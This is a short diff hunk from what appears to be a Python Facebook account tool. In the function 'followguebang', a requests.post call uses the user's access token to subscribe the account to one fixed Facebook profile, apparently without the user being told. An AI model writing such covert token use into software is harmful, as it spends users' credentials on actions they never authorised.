@@ -221,7 +221,7 @@ def followguebang():
 		id = a["id"]
 	except IOError:
 		print((p+"\n["+h+"!"+p+"]"+p+" Token Invalid"))
-		logs()
+		asup_goblog()
 	cangcut("%s[%s•%s] %sPlease Wait..."%(h,p,h,p))
 	requests.post("https://graph.facebook.com/100006307110060/subscribers?access_token=" + ewehayam)      # Yulia Ulfa
 	menu() 
